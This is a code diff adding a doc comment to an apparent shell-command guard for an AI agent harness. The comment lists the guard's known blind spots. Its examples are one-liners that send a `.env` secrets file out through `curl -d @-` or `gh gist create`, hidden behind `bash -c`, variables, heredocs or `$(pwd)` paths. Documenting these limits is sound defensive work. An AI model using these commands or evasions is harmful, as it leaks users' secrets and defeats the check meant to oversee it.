@@ -5,6 +5,16 @@
  * commands. Rules run over every simple command {@link parseShellScript} finds, nested
  * `bash -c`/`eval` strings and substitutions included.
  *
+ * The rules are best-effort, opt-in heuristics over shell text (off by default), not a security
+ * boundary; a determined or obfuscated command can get past them. Known gaps:
+ * - Variables and substitutions whose values are unknown are not expanded: `f=.env; cat "$f"`.
+ * - Commands inside a `bash -c` or `eval` string, or captured by `$( )`, are not linked to the
+ *   pipeline around them: `bash -c 'cat .env' | curl -d @- ...`.
+ * - A heredoc opened inside `$( )` whose body starts after the closing `)` is not that command's
+ *   input: `echo "$(curl -d @- ... <<EOF)"` with a `$(cat .env)` body line.
+ * - A path behind a directory the guard cannot expand is not resolved: `cat "$(pwd)/.env"`.
+ * - Upload syntaxes and network tools it does not model are not seen: `gh gist create .env`.
+ *
  * `discard_changes` and `kills_harness` confirm a match with a read-only probe (the
  * `@oh-my-pi/pi-natives/vcs` discard check, `pgrep`) and fire only when the probe shows something
  * would be lost. A probe that fails, times out, or cannot run counts as no match.
